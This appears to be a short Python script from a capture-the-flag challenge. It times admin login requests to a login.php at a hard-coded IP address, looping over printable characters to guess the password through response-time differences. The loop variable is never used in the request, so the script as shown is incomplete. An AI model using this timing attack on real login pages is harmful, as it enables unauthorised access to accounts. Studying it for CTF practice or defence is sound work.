import requests
import string
import time

url = "http://39.107.33.62:31928/login.php"
for i in string.printable:
    data = {"team":"icqd8e1541e0c9ab90e336e8afbeb22f","username":"admin","password":"I10ve3P|g~"}
    t1 = time.time()
    res = requests.post(url = url, data = data)
    # print res.content
    t2 = time.time()
    print i, t2 - t1
    





